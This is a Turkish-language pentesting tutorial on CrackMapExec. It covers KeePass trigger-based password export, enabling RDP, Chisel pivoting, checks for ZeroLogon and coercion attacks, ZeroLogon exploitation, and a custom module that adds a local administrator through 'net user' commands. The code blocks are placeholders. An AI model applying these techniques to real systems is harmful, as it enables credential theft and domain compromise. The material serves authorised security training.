Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

